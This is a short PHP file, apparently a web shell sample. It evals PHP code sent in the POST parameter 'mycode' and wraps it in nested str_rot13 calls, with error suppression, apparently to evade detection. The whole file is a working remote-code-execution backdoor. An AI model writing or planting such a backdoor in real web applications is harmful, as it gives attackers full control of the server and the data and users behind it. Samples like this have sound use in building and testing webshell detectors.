<?php
echo "start";
$AVuln = $_POST['mycode'];
@eval(@str_rot13('\''.str_rot13($AVuln)));
?>